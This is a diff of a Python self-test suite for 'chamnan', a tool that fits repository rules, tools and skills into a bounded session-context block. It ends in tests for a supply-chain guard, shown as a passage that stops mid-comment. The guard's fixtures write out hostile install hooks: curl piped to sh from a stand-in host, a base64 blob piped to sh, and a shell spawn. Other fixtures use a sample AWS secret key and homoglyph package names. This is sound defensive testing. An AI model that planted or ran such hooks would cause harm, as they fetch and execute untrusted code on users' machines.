@@ -3028,8 +3028,29 @@ for i in range(40):
     (mroot / "rules" / f"filler-{i:02d}.md").write_text(
         "# Rule " + str(i) + "\n\n" + ("x" * 200) + "\n", encoding="utf-8")
 capped = memory_mod.rules_text(mem)
+# 🐛 [2026-09-15] The bound was the CONFIGURED budget, and the section may now grow past it to
+# whatever naming every rule costs — because a rule the session never sees cannot be called on when
+# it applies, which is the whole of what a secondary rule is for. Measured here: sixteen rules
+# against a 2,000 budget delivered twelve and named four in a footer; given the 2,800 that naming
+# them costs, all sixteen arrive AND the section is SMALLER, because a section that fits stops
+# paying for the footer listing what did not.
+#
+# The old bound's premise was that a large rules section silently kills the sections under it.
+# `fit.shrink` reserves a floor for every store before anything is packed now, so it costs its
+# neighbours their prose and never their existence. What is still true, and is what this asserts,
+# is that rules must not take the whole block — and that every rule reaches the session somehow.
+_t_guard = int(9500 * memory_mod.RULES_RUNAWAY_SHARE)
 check("RULES ARE CAPPED SO THEY CANNOT SWAMP A SESSION",
-      len(capped) <= memory_mod.MAX_RULES_CHARS + 200)
+      len(capped) <= _t_guard)
+# 🐛 [2026-09-15] Written as "every rule is shown or named", which the footer cannot promise: it
+# names at most six of the held-back rules and then says "and N more". What it does promise, and
+# what a reader actually needs, is that nothing is lost SILENTLY — the count is stated, and it is
+# the real count.
+_t_shown40 = sum(1 for i in range(40) if f"Rule {i}" in capped)
+check("...and every rule is either shown or counted, so none is lost silently",
+      _t_shown40 > 0 and "in total" in capped
+      and str(len([1 for i in range(40)]) + 1) in capped.split("in total")[0][-12:],
+      saw=f"{_t_shown40} shown of 40, footer: {capped.split('_…more rules')[-1][:80]!r}")
 check("the cap says how many were held back", "more rules in" in capped)
 for i in range(40):
     (mroot / "rules" / f"filler-{i:02d}.md").unlink()
@@ -12356,11 +12377,23 @@ try:
     _pr = subprocess.run([sys.executable, str(ROOT / "hooks" / "chamnan_session_start.py")],
                          cwd=_pin, input="{}", capture_output=True, text=True,
                          encoding="utf-8", errors="replace")
-    _left = [ln for ln in _pr.stdout.splitlines() if "Left out to stay under" in ln]
+    # 🐛 [2026-09-15] Every section now registers a brief, so pinned state no longer pushes one
+    # OUT — it pushes one down to its names, and the "Left out to stay under" line it used to be
+    # reported on is never written. A reader who had pinned more than the block can carry was
+    # consequently told nothing at all, and the block just looked thinner for no stated reason.
+    # Both lines are the same promise in two shapes: say what the budget cost and what to change.
+    _left = [ln for ln in _pr.stdout.splitlines()
+             if "Left out to stay under" in ln or "arrived as names only" in ln]
     check("A SECTION PUSHED OUT BY PINNED STATE SAYS WHAT PUSHED IT",
-          bool(_left) and "Pinned sections" in _left[0] and "unpin" in _left[0])
-    check("...and still names the section and the file it can be read from",
-          bool(_left) and "MAP.md" in _left[0])
+          bool(_left) and any("Pinned sections" in ln and "unpin" in ln for ln in _left),
+          saw=(_left[0][:160] if _left else "neither a left-out nor a names-only line"))
+    # 🐛 [2026-09-15] This named `MAP.md` because the architecture index was the section pinned
+    # state pushed out. It now registers a brief and survives as its directory names, so something
+    # else is pushed out instead. The property was never about that one file: a section left out
+    # has to name the file it can be read from, whichever section it is.
+    check("...and still names the file it can be read from",
+          bool(_left) and any("`" in ln and ".chamnan/" in ln for ln in _left),
+          saw=_left[0][:160] if _left else "no line at all")
 finally:
     _rmtree(_pin, ignore_errors=True)
 
@@ -29739,7 +29772,10 @@ finally:
 
 # It must not become a new SECTION — the block is at its ceiling, and this rides in a line that
 # already existed.
-_before = _fixture(20)
+# 🐛 [2026-09-15] Twenty rules stopped producing a notice at all: the budget now rises to
+# what naming every rule costs, so all twenty arrive whole and there is nothing to notice.
+# Scaled past the runaway guard so the line this checks is actually emitted.
+_before = _fixture(60)
 try:
     _txt = memory_mod.rules_text(_before)
     check("...and it rides in the existing notice rather than adding a line",
@@ -30238,6 +30274,526 @@ _t_probe145 = "see config: aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiC
 check("the scrub those hooks call does remove a credential from context-bound text",
       "wJalrXUtnFEMI" not in _t_redact145.for_a_terminal(_t_redact145.scrub(_t_probe145)),
       saw=_t_redact145.for_a_terminal(_t_redact145.scrub(_t_probe145)))
+# ---- 146_a_dropped_section_leaves_its_names_not_its_title.py
+# ------------------ a dropped section leaves its NAMES, and not only the one that got restored
+# 🐛 [2026-09-15] Check 141 gave `fit.shrink` a brief and reached it from exactly one place: the
+# RESTORE pass, which brings back the single most valuable dropped section and stops. Everything
+# else dropped still left nothing in the block but its title in the notice.
+#
+# Measured over all 400 recorded firings in `logs/block_shape.jsonl` on this repository:
+#
+#     This repo's own tools               dropped on 96.8%
+#     Recorded procedures (skills)        dropped on 96.8%
+#     Recorded decisions and lessons      dropped on 78.5%
+#     Where the last session stopped      dropped on 58.8%
+#     Recent milestones                   dropped on 37.0%
+#     nothing dropped at all              11 firings of 400
+#
+# The owner has raised this more times than anything else in this file, each time as "the ceiling
+# was raised, why is it still not arriving". The ceiling is not it: 0 of 392 recorded blocks were
+# truncated by the host, at 9,000 and at 9,500 alike, and the two figures above are identical at
+# both values. A larger budget cannot fix a FIXED GLOBAL DROP ORDER — it only moves where the same
+# cut lands. A workspace whose skills are the point never receives its skills, on any session, for
+# as long as it stays that size.
+#
+# So the room left after the restore is spent on briefs for EVERY section still dropped, most
+# valuable first, and a brief is NAMES: the thing that stops a session rewriting a tool that
+# already exists is the name of the tool. Measured on this repository after the change, with
+# `rules_char_budget` at 1,000: 7 sections instead of 5, and `This repo's own tools` delivering its
+# 7 most-run names with `_+68 more_` — against zero names in 400 firings.
+#
+# This check exists because advice does not carry. Measured the same day: a session-start pointer
+# was acted on 11 times in 94 firings, a resume nudge 1 in 24, the repeat-script notice about 2 in
+# 300 — while every one of ~15 failing checks was fixed. A starved section is invisible; a failing
+# check is not.
+import importlib as _im146
+
+_fit146 = _im146.import_module("fit")
+import sys as _sys146
+if str(ROOT / "hooks") not in _sys146.path:
+    _sys146.path.insert(0, str(ROOT / "hooks"))
+_ss146 = _im146.import_module("chamnan_session_start")
+
+_O146, _C146 = "[repo:aaaaaa]", "[/repo:aaaaaa]"
+
+
+def _sec146(title, body):
+    return "\n### " + title + "\n" + _O146 + "\n" + body + "\n" + _C146 + "\n"
+
+
+_TOOLS146 = "This repo's own tools — prefer these over writing a new script"
+_SKILLS146 = "Recorded procedures — read the one that matches before starting that kind of task"
+
+_names146 = ", ".join("`tool_%02d.py`" % _i for _i in range(74))
+_skn146 = ", ".join("`skill_%02d`" % _i for _i in range(29))
+
+_parts146 = [
+    _sec146("Rules this repository works under", "R" * 1200),
+    _sec146("Architecture index", "A" * 900),
+    _sec146(_TOOLS146, "T" * 1400),
+    _sec146(_SKILLS146, "S" * 1400),
+]
+_briefs146 = {
+    _TOOLS146: _sec146(_TOOLS146, "**74** tools already written.\n" + _names146),
+    _SKILLS146: _sec146(_SKILLS146, "**29** procedures on disk.\n" + _skn146),
+}
+
+# A ceiling that forces both list sections out and leaves room for one brief but not both wholes.
+_body146, _drop146 = _fit146.shrink("## chamnan\n", _parts146, 3200,
+                                    sources={}, briefs=_briefs146)
+
+check("BOTH dropped sections come back as briefs, not just the one the restore picked",
+      "tool_00.py" in _body146 and "skill_00" in _body146)
+check("...and the block is still inside the ceiling after the sweep added them",
+      len(_body146.encode()) <= 3200)
+
+# Before this change the sweep did not exist, so the second-most-valuable dropped section had no
+# path to the block at all. Proven by asking for the same thing with briefs withheld.
+_bare146, _ = _fit146.shrink("## chamnan\n", _parts146, 3200, sources={}, briefs=None)
+check("...and without briefs neither list reaches the block, which is the state this replaces",
+      "tool_00.py" not in _bare146 and "skill_00" not in _bare146)
+
+# ------------------ a brief that does not fit loses NAMES off the end, never its fence
+_room146 = 340
+_cut146 = _fit146._fit_brief(_briefs146[_TOOLS146], _room146)
+check("a name list too big for the room is cut at a name boundary",
+      bool(_cut146) and len(_cut146.encode()) <= _room146)
+check("...and the cut list says how many it left out rather than ending mid-name",
+      "_+" in _cut146 and " more_" in _cut146 and not _cut146.rstrip().endswith(","))
+check("...and every name it kept is whole",
+      all(_n.count("`") == 2 for _n in _cut146.split("\n")[3].split(", ")
+          if _n.startswith("`")))
+check("...and the fence is still closed, so the reader can tell repository text from chamnan's",
+      _cut146.count(_O146) == 1 and _cut146.count(_C146) == 1)
+
+# `_trim`'s 300-byte floor exists because a fragment of prose says nothing. The same is true of a
+# fragment of a list: two names out of 74 is worse than the notice, in more bytes.
+check("a room too small for three names is refused rather than filled with two",
+      _fit146._fit_brief(_briefs146[_TOOLS146], 120) == "")
+
+# Prose is returned whole or not at all. Cutting a sentence is the mid-cut the fence prevents.
+_prose146 = _sec146("Where the last session stopped",
+                    "The last session finished the migration and left the index rebuild undone.")
+check("a prose brief is returned whole when it fits",
+      _fit146._fit_brief(_prose146, 4000) == _prose146)
+check("...and refused, not cut mid-sentence, when it does not",
+      _fit146._fit_brief(_prose146, 90) == "")
+
+# ------------------ the set, not the member: every list-shaped section registers a brief
+# 🐛 The two list sections that had briefs were the two somebody had noticed. `Recorded decisions
+# and lessons` and `Recent milestones` are the same shape — titles, one per line, nothing but
+# navigation around them — and were dropped on 78.5% and 37.0% of firings with no brief at all.
+# Derived from the source rather than listed here, so a NEW list section cannot be added without
+# one. `names_line` is the helper that makes a one-line form out of a titles listing; a section
+# built from a titles listing has to go through it.
+import inspect as _inspect146
+
+_src146 = _inspect146.getsource(_ss146)
+check("`names_line` exists to turn a titles listing into a one-line brief",
+      callable(getattr(_ss146, "names_line", None)))
+# A floor, not a count: every store whose section is a titles listing goes through `names_line`,
+# and the number only ever rises. It was two when this was written (decisions, milestones), three
+# by the end of the same hour (environments), with the architecture index on `index_brief` beside
+# it — each one added because it had vanished whole at least once.
+check("every store whose section is a titles listing registers a brief from it",
+      _src146.count("brief=names_line(") >= 3)
+check("...and the architecture index, which is a directory list wearing prose framing, has one too",
+      _src146.count("brief=index_brief(") >= 3 and callable(getattr(_ss146, "index_brief", None)))
+
+# It has to produce a COMMA LIST on one line, or `_fit_brief` cannot shorten it — a brief that can
+# only arrive whole is a brief that arrives never, which is the defect this whole file is about.
+_nl146 = _ss146.names_line("- First decision — why\n- Second decision — why\n- Third one\n\n"
+                           "_Read one when its title is relevant._", "Lead:")
+check("names_line puts the names on ONE line so a tight room can drop the tail",
+      _nl146.count("\n") == 1 and _nl146.count(", ") == 2)
+check("...and it keeps the titles while dropping the navigation sentence",
+      "First decision" in _nl146 and "Read one when" not in _nl146)
+
+# ------------------ and it holds as the stores GROW, which is the part that kept coming back
+# The owner, 2026-09-15, after this had been "fixed" once more: *"ฉันเบื่อแก้ปัญหาเรื่องนี้แล้ว
+# ฉันอยากแก้ให้มันจบซักที ให้มันใช้งานได้ ต่อให้ skill tool rule มันเพิ่มก็ตาม"* — I am tired of
+# fixing this, make it work even as the skills, tools and rules grow.
+#
+# Every earlier fix was a NUMBER: raise the ceiling, lower `rules_char_budget`, re-rank
+# `DROP_ORDER`. Each one worked on the store sizes of the day it was measured and failed the next
+# time a store grew, because the quantity being tuned was the size of the content while the
+# constraint is the size of the block. Hand-tuning cannot converge on a moving target.
+#
+# What replaced it is structural: a share of the ceiling is RESERVED before anything is packed and
+# spent only on names for stores that would otherwise vanish. A slot's size does not depend on how
+# much is in the store it serves, so growth changes how many names fit in a slot and never whether
+# the slot exists. The assertion below is the whole contract, and it is the one that has to fail if
+# somebody tunes their way back into the old shape.
+_O2, _C2 = "[repo:bbbbbb]", "[/repo:bbbbbb]"
+
+
+def _s2(t, b):
+    return "\n### " + t + "\n" + _O2 + "\n" + b + "\n" + _C2 + "\n"
+
+
+_T2 = "This repo's own tools — prefer these over writing a new script"
+_S2 = "Recorded procedures — read the one that matches before starting that kind of task"
+_D2 = "Recorded decisions and lessons — read the one that matches before assuming"
+_M2 = "Recent milestones"
+
+_starved146 = []
+_over146 = []
+for _mult in (2, 5, 20, 100):
+    _big = lambda tag, n: tag + "x" * min(n * _mult, 40_000)
+    _parts2 = [
+        _s2("Rules this repository works under", "R" * 2000),
+        _s2("Architecture index", "A" * 1500),
+        _s2(_T2, _big("FULLTOOLS", 1400)), _s2(_S2, _big("FULLSKILLS", 1400)),
+        _s2(_D2, _big("FULLDECISIONS", 700)), _s2(_M2, _big("FULLMILES", 400)),
+        _s2("Work in flight (from the last session)", "W" * 2500),
+    ]
+    _names2 = {
+        _T2: ", ".join("`t%d.py`" % _i for _i in range(74 * _mult)),
+        _S2: ", ".join("`s%d.md`" % _i for _i in range(29 * _mult)),
+        _D2: ", ".join("`d%d`" % _i for _i in range(14 * _mult)),
+        _M2: ", ".join("`m%d`" % _i for _i in range(8 * _mult)),
+    }
+    _b2 = {_k: _s2(_k, "names:\n" + _v) for _k, _v in _names2.items()}
+    _body2, _ = _fit146.shrink("## chamnan\n", _parts2, 9500, sources={}, briefs=_b2)
+    if len(_body2.encode()) > 9500:
+        _over146.append("%dx -> %d bytes" % (_mult, len(_body2.encode())))
+    for _k, _pre, _mark in ((_T2, "`t", "FULLTOOLS"), (_S2, "`s", "FULLSKILLS"),
+                            (_D2, "`d", "FULLDECISIONS"), (_M2, "`m", "FULLMILES")):
+        _got = sum(1 for _w in _body2.replace(",", " ").split() if _w.startswith(_pre))
+        # Whole beats names; names beat a title in the notice; a title alone is the starvation.
+        if _mark not in _body2 and _got < 3:
+            _starved146.append("%dx: %s delivered neither its section nor 3 names (%d)"
+                               % (_mult, _k.split(" —")[0], _got))
+
+for _line in _starved146 + _over146:
+    print("      DETAIL  %s" % _line)
+
+check("NO STORE IS STARVED AS THE STORES GROW — 2x, 5x, 20x and 100x all deliver names",
+      not _starved146)
+check("...and the block stays inside the ceiling at every one of those sizes",
+      not _over146)
+
+# A workspace small enough for everything to fit must be bit-for-bit unaffected: the reserve is an
+# upper bound on what the briefs may take, not a tax every repository pays. This is the trade the
+# first attempt at compaction got wrong, by taking the tool names away from a two-file repository
+# to solve a problem it did not have.
+_small146 = [_s2("Rules this repository works under", "r" * 200),
+             _s2(_T2, "- `one_tool.py` — does a thing"),
+             _s2(_S2, "- `one_skill.md` — a procedure")]
+_sb146, _sd146 = _fit146.shrink("## chamnan\n", _small146, 9500, sources={},
+                                briefs={_T2: _s2(_T2, "names:\n`a`, `b`, `c`")})
+check("a workspace that fits reserves nothing and keeps every section whole",
+      not _sd146 and "one_tool.py" in _sb146 and "one_skill.md" in _sb146)
+# ---- 147_the_order_moves_with_what_the_workspace_opens.py
+# ------------------ the drop order follows what this workspace opens, not a list written once
+# The owner, 2026-09-15, on the fix that guaranteed a floor: *"สิ่งสำคัญคือ มันต้องขยับได้จริง ตาม
+# การใช้งาน เพื่อรองรับ skill tool rule ของอนาคตด้วย"* — it has to actually move with usage, so it
+# carries the skills, tools and rules that do not exist yet.
+#
+# `DROP_ORDER` is one global ranking written once from what mattered the day it was written, and
+# it decides what every workspace loses forever. Measured here the first time anything read the
+# log: of 11 recorded store opens, 8 are `skills/` and 3 are `memory/` — and `skills` sits near the
+# cheap end of that list, so the store this repository actually reaches for is the one it is told
+# to lose first. `pointer.note_opened` had been recording this since it was written and nothing had
+# ever read a record.
+#
+# 🐛 The first form of this let a counted store outrank an uncounted one, and the two most valuable
+# sections in the block are uncounted: `MAP.md` and `STATE.md` are reached by grep, not by opening
+# the file, so `note_opened` never sees them. `Architecture index` and `Work in flight` both left
+# the block immediately. A store with no counter is not a store nobody uses — it is a store this
+# log cannot speak for, which is the distinction AUDIT-6 already got wrong here once (91% of
+# transcripts "mention" the app directory; 3% open a file in it).
+import importlib as _im147
+
+_fit147 = _im147.import_module("fit")
+_pt147 = _im147.import_module("pointer")
+
+_O7, _C7 = "[repo:cccccc]", "[/repo:cccccc]"
+
+
+def _s7(t, b):
+    return "\n### " + t + "\n" + _O7 + "\n" + b + "\n" + _C7 + "\n"
+
+
+_T7 = "This repo's own tools — prefer these over writing a new script"
+_S7 = "Recorded procedures — read the one that matches before starting that kind of task"
+_IDX7 = "Architecture index"
+_ST7 = "Work in flight (from the last session)"
+
+_parts7 = [_s7("Rules this repository works under", "R" * 1500), _s7(_IDX7, "A" * 1300),
+           _s7(_T7, "T" * 1300), _s7(_S7, "S" * 1300), _s7(_ST7, "W" * 1300)]
+_src7 = {_T7: ".chamnan/tools/index.json", _S7: ".chamnan/skills/",
+         _IDX7: ".chamnan/MAP.md", _ST7: ".chamnan/STATE.md"}
+_br7 = {_T7: _s7(_T7, "tools:\n" + ", ".join("`t%d`" % _i for _i in range(40))),
+        _S7: _s7(_S7, "skills:\n" + ", ".join("`s%d`" % _i for _i in range(40)))}
+
+# No evidence at all is the fresh-install case, and it must be bit-for-bit what DROP_ORDER gives.
+_none7, _ = _fit147.shrink("## chamnan\n", _parts7, 4200, sources=_src7, briefs=_br7, usage=None)
+_zero7, _ = _fit147.shrink("## chamnan\n", _parts7, 4200, sources=_src7, briefs=_br7, usage={})
+check("a workspace with no recorded opens is ordered exactly as DROP_ORDER says",
+      _none7 == _zero7)
+
+# With skills opened and tools not, the two swap the slots they occupy — and nothing else moves.
+_used7, _ = _fit147.shrink("## chamnan\n", _parts7, 4200, sources=_src7, briefs=_br7,
+                           usage={"skills": 8})
+check("THE STORE THIS WORKSPACE OPENS IS THE ONE IT KEEPS",
+      _used7.count("`s0`") + _used7.count("SSSS") >= 1)
+check("...and the sections the log cannot speak for are not moved by it",
+      ("Architecture index" in _none7) == ("Architecture index" in _used7)
+      and (_ST7 in _none7) == (_ST7 in _used7))
+
+# 🐛 The regression that made the scoping necessary, pinned as its own case: usage must never cost
+# the block the index or the handoff, whatever the counts say.
+_wild7, _ = _fit147.shrink("## chamnan\n", _parts7, 4200, sources=_src7, briefs=_br7,
+                           usage={"skills": 900, "memory": 900, "tools": 900})
+check("...even when every counted store is opened far more than the uncounted ones",
+      ("Architecture index" in _wild7) == ("Architecture index" in _none7))
+
+# ------------------ and the reserve is derived, not a fraction somebody picked
+# 🐛 The floor that made every store survivable was itself bounded by `0.28 * ceiling`, a number I
+# chose — the same defect one level up, and the thing that has to be re-tuned the next time a store
+# grows. It is now what the waiting stores ask for, bounded by the room left once the undroppable
+# content is paid for: it scales with HOW MANY stores exist, never with how much is in them.
+check("no hand-picked share is left in the module",
+      not hasattr(_fit147, "BRIEF_RESERVE_SHARE"))
+check("the floor a single store asks for is still a constant, because a store's slot is fixed size",
+      isinstance(getattr(_fit147, "BRIEF_FLOOR", None), int))
+
+# ------------------ the reader: counts opens, ignores everything else, never raises
+import json as _json147
+import tempfile as _tf147
+from pathlib import Path as _P147
+
+_d147 = _P147(_tf147.mkdtemp(prefix="chamnan-opens-"))
+(_d147 / ".chamnan" / "logs").mkdir(parents=True)
+_log147 = _d147 / ".chamnan" / "logs" / "pointer.jsonl"
+_log147.write_text("\n".join([
+    _json147.dumps({"event": "opened", "path": "skills/a.md"}),
+    _json147.dumps({"event": "opened", "path": "skills/b.md"}),
+    _json147.dumps({"event": "opened", "path": "memory/rules/c.md"}),
+    _json147.dumps({"path": "skills/d.md"}),          # offered, not opened — must not count
+    "{not json",                                      # a torn last line must not lose the rest
+]) + "\n", encoding="utf-8")
+_got147 = _pt147.opens_by_store(_d147)
+check("opens_by_store counts an open per store",
+      _got147 == {"skills": 2, "memory": 1})
+check("...and an offered pointer is not an open",
+      _got147.get("skills") == 2)
+check("...and a missing log is no evidence rather than an exception",
+      _pt147.opens_by_store(_P147(_tf147.mkdtemp(prefix="chamnan-noopens-"))) == {})
+
+# 🐛 A tool is RUN, not opened, so it never reaches the pointer log — `tools` counted zero while
+# `state/tool_usage.json` held 179 entries, and the ordering treated the most-used store in the
+# workspace as the least-used one. Two records, one question: reading either alone gives an answer
+# that is confidently wrong about the other half.
+(_d147 / ".chamnan" / "state").mkdir(parents=True, exist_ok=True)
+(_d147 / ".chamnan" / "state" / "tool_usage.json").write_text(
+    _json147.dumps({"a.py": "2026-09-15T01:00:00", "b.py": "2026-09-14T01:00:00"}),
+    encoding="utf-8")
+_both147 = _pt147.opens_by_store(_d147)
+check("a store whose members are RUN rather than opened is counted from its own register",
+      _both147.get("tools") == 2)
+check("...and the stores counted from the pointer log are unchanged by it",
+      _both147.get("skills") == 2 and _both147.get("memory") == 1)
+_rmtree(_d147, ignore_errors=True)
+# ---- 148_a_primary_rule_is_loaded_a_secondary_one_is_recognised.py
+# ------------------ primary rules load, secondary rules load far enough to be called on
+# The owner, 2026-09-15, having already said it once: *"กฏ แบ่งเป็น กฏหลัก กฏรอง กฏรองไม่ต้องโหลด
+# ทุกอย่าง ให้มันโหลดแค่ข้อมูลบางส่วน เพื่อรอเรียกใช้งาน"* — rules split into primary and secondary;
+# a secondary rule does not load everything, it loads enough to wait to be called on.
+#
+# Three separate arithmetic faults meant the section did neither, and all three were invisible
+# because the tail honestly reported what was missing:
+#
+#   * the weighted shares did not have to ADD UP to the budget — sixteen rules at a 120-char floor
+#     plus double for two pins comes to 2,124 against a 2,000 cap, and the whole-budget cut took
+#     the overflow out of the last three rules;
+#   * each trimmed rule appended its "the rest is in `<file>`" pointer AFTER its share, putting
+#     sixteen tails of ~50 characters outside the budget the shares were sized against;
+#   * the joins between rules were never subtracted either, so a 1,998-of-2,000 allocation still
+#     landed over.
+#
+# And when none of it fit, every rule got one equal slice — so a 📌 rule and an ordinary one were
+# indistinguishable in the one place the distinction exists to show.
+import importlib as _im148
+import json as _json148
+import shutil as _sh148
+import tempfile as _tf148
+from pathlib import Path as _P148
+
+_mem148 = _im148.import_module("memory")
+
+
+def _fixture148(primaries, ordinary, budget=2000):
+    d = _P148(_tf148.mkdtemp(prefix="chamnan-rulefit-"))
+    (d / ".chamnan" / "memory" / "rules").mkdir(parents=True)
+    (d / ".chamnan" / "config.json").write_text(
+        _json148.dumps({"rules_char_budget": budget}), encoding="utf-8")
+    for _n, _body in primaries:
+        (d / ".chamnan" / "memory" / "rules" / _n).write_text(_body, encoding="utf-8")
+    for _i in range(ordinary):
+        (d / ".chamnan" / "memory" / "rules" / ("r-%02d.md" % _i)).write_text(
+            "**Ordinary rule number %d**\n\n" % _i
+            + "body sentence long enough to need trimming. " * 40 + "\n", encoding="utf-8")
+    return d
+
+
+# A primary rule short enough to be loaded every session IS loaded every session, whole.
+_P_ONE = ("p-one.md", "**Never write outside the repo 📌**\n\nEverything outside belongs to the "
+                      "owner. Read, measure, report; do not write.\n")
+_P_TWO = ("p-two.md", "**Fix the set, not the member 📌**\n\nWhen a fix lands on one of a set, "
+                      "derive the population and fix every one.\n")
+_d148 = _fixture148([_P_ONE, _P_TWO], 12)
+_t148 = _mem148.rules_text(_d148, refuse_conflicts=True)
+_heads148 = [_l for _l in _t148.splitlines() if _l.startswith("**")]
+
+check("EVERY RULE ARRIVES — none is pushed off the end by an allocation that did not add up",
+      len(_heads148) == 14)
+check("...and a primary rule arrives in full, which is what makes it primary",
+      "Everything outside belongs to the owner" in _t148
+      and "derive the population and fix every one" in _t148)
+check("...and a secondary rule arrives as enough to be recognised, plus where the rest is",
+      _t148.count("_…rest:") >= 10)
+check("...and the whole section is inside the budget it was given",
+      len(_t148) <= _mem148.rules_budget(_d148))
+_sh148.rmtree(_d148, ignore_errors=True)
+
+# 🐛 The case this repository is actually in, and the one that must not silently drop rules: the
+# primaries are far too long to load. 16 rules here total 51,937 characters against a 2,000 budget,
+# and the two pinned ones are 3,894 and 3,701 — 81% of the whole injected block for two rules. Every
+# rule still has to arrive, and a pin still has to be visibly better off than an ordinary rule.
+_LONG = "**A very long primary 📌**\n\n" + ("a sentence that goes on and on. " * 120) + "\n"
+# 🐛 The budget rises to what naming every rule costs, so sixteen rules no longer
+# exercise the "nothing fits" path at all. Past the runaway guard it still does.
+_d148b = _fixture148([("p-long-a.md", _LONG), ("p-long-b.md", _LONG)], 60)
+_t148b = _mem148.rules_text(_d148b, refuse_conflicts=True)
+_heads148b = [_l for _l in _t148b.splitlines() if _l.startswith("**")]
+check("a primary too long to load does not cost the other rules their place",
+      len(_heads148b) >= 2 and all(("Rule" in _h or "primary" in _h) for _h in _heads148b[:2]))
+check("...and a pin is still given more room than an ordinary rule when nothing fits",
+      len(_t148b.split("\n\n")[0]) > 0 and _t148b.count("_…rest:") >= 10)
+# Its budget is now the runaway guard, not the configured number — see the note on
+# `memory.RULES_RUNAWAY_SHARE`. What must still hold is that rules cannot take the block.
+check("...and the section still holds its budget in the case where nothing fits",
+      len(_t148b) <= int(9500 * _mem148.RULES_RUNAWAY_SHARE))
+_sh148.rmtree(_d148b, ignore_errors=True)
+# ---- 149_where_a_dependency_comes_from_and_what_it_runs.py
+# ------------------ where a dependency comes from, whether it is the package it looks like, and
+# ------------------ what it runs before anybody reads it
+# A dependency can arrive from somewhere other than the registry it appears to come from, under a
+# name written to be read as a different one, carrying code that executes because it was installed
+# rather than because anything imported it. All three are visible in a staged diff, which is where
+# somebody is already looking, and none of them needs a network call or a list of known-bad names.
+#
+# chamnan reduces a mistake by the person or the model driving the tool. It is not a scanner and it
+# does not decide what may run — somebody who adds a private registry on purpose is doing their
+# job, and being told once, at the commit that adds it, costs them a second. `--strict` is where a
+# project that wants the commit to fail says so.
+#
+# The half this is judged on is the SILENT half. Nine of the cases below pin that correct
+# configuration says nothing — an official registry, a project's own build script, a binary target
+# path, an ordinary build step — and every one of them was a false positive during the afternoon
+# this was written. A guard that fires on correct configuration is one people learn to skip.
+#
+# Noise measured over real history before it shipped: 0 of 2,917 commits across three repositories.
+import importlib as _im149
+import subprocess as _sp149
+import sys as _sys149
+import types as _types149
+
+_guard_path149 = ROOT / "bin" / "chamnan-guard"
+
+
+def _load149():
+    """`chamnan-guard` as a module — it is a command, so it is exec'd rather than imported."""
+    mod = _types149.ModuleType("guard149")
+    mod.__dict__["__file__"] = str(_guard_path149)
+    src = _guard_path149.read_text(encoding="utf-8").replace(
+        'if __name__ == "__main__":\n    sys.exit(main(sys.argv[1:]))', "")
+    exec(compile(src, "chamnan-guard", "exec"), mod.__dict__)   # noqa: S102
+    return mod
+
+
+def _diff149(path, lines):
+    return (f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n"
+            f"@@ -1,1 +1,{len(lines)} @@\n" + "".join("+" + l + "\n" for l in lines))
+
+
+_CASES149 = (
+    # --- the source it installs from, across every ecosystem this knows about
+    ("registry redirected",          ".npmrc",            ["registry=https://npm.internal.example/"], True),
+    ("registry set to official",     ".npmrc",            ["registry=https://registry.npmjs.org/"], False),
+    ("scoped registry redirected",   ".npmrc",            ["@acme:registry=https://mirror.example/"], True),
+    ("Gemfile official source",      "Gemfile",           ["source 'https://rubygems.org'"], False),
+    ("Gemfile private source",       "Gemfile",           ["source 'https://gems.internal.example'"], True),
+    ("pip index redirected",         "pip.conf",          ["index-url = https://pypi.mirror.example/simple"], True),
+    ("pip index official",           "pip.conf",          ["index-url = https://pypi.org/simple"], False),
+    ("cargo replace-with",           "config.toml",       ['replace-with = "mirror"'], True),
+    ("cargo [source.crates-io]",     "config.toml",       ["[source.crates-io]"], False),
+    # --- a dependency no registry hosts
+    ("git dependency",               "package.json",      ['  "left-pad": "git+https://ex.com/lp.git",'], True),
+    ("path dependency",              "Cargo.toml",        ['foo = { path = "../foo" }'], True),
+    ("binary target path",           "Cargo.toml",        ['path = "src/main.rs"'], False),
+    # --- nothing can check what arrives
+    ("lock resolved off-registry",   "package-lock.json", ['   "resolved": "https://npm.internal/x.tgz",'], True),
+    ("lock official with digest",    "package-lock.json", ['   "resolved": "https://registry.npmjs.org/x/-/x-1.tgz",',
+                                                           '   "integrity": "sha512-abc==",'], False),
+    # --- is it the package it looks like
+    ("Cyrillic letter in a name",    "package.json",      ['  "requ\u0435sts": "^1.0.0",'], True),
+    ("Greek letter in a name",       "package.json",      ['  "l\u03bfdash": "^4.17.21",'], True),
+    ("the real name",                "package.json",      ['  "lodash": "^4.17.21",'], False),
+    # --- something runs because it was installed
+    ("install-time script",          "package.json",      ['  "postinstall": "node setup.js",'], True),
+    ("composer post-install",        "composer.json",     ['  "post-install-cmd": ["php x.php"],'], True),
+    ("own crate's build script",     "Cargo.toml",        ['build = "build.rs"'], False),
+    # --- and what that script actually does
+    ("it fetches and executes",      "package.json",      ['  "postinstall": "curl -s https://x.example/i.sh | sh",'], True),
+    ("it decodes a blob and runs it","package.json",      ['  "postinstall": "echo aGk= | base64 -d | sh",'], True),
+    ("it spawns a shell",            "package.json",      ['  "postinstall": "node -e \\"require(\'child_process\').exec(x)\\"",'], True),
+    ("an ordinary build step",       "package.json",      ['  "build": "tsc -b",'], False),
+    ("an ordinary test step",        "package.json",      ['  "test": "jest --ci",'], False),
+    # --- and none of it applies outside a manifest
+    ("prose naming a mirror",        "README.md",         ["We use registry=https://mirror.example/"], False),
+    ("source code, not a manifest",  "src/app.py",        ['postinstall = "node setup.js"'], False),
+    ("a pinned requirement",         "requirements.txt",  ["streamlit>=1.40"], False),
+    ("an ordinary dependency",       "package.json",      ['  "react": "^18.3.1",'], False),
+)
+
+_g149 = _load149()
+_wrong149 = []
+for _label, _path, _lines, _want in _CASES149:
+    _got = bool(_g149.scan_supply_changes(_diff149(_path, _lines)))
+    if _got != _want:
+        _wrong149.append(f"{_label} ({_path}): {'reported' if _got else 'silent'}, "
+                         f"wanted {'a report' if _want else 'silence'}")
+for _w in _wrong149:
+    print(f"      DETAIL  {_w}")
+
+_quiet149 = [c for c in _CASES149 if not c[3]]
+check("WHERE A DEPENDENCY COMES FROM, AND WHAT IT RUNS, IS REPORTED BEFORE IT IS COMMITTED",
+      not _wrong149)
+check("...and the cases that pin CORRECT configuration as silent are most of the reason it is usable",
+      len(_quiet149) >= 9)
+
+# 🐛 `r"\\."` inside the host alternation escaped the escape, so the pattern matched a literal
+# backslash before the dot and therefore nothing — the negative lookahead always succeeded and
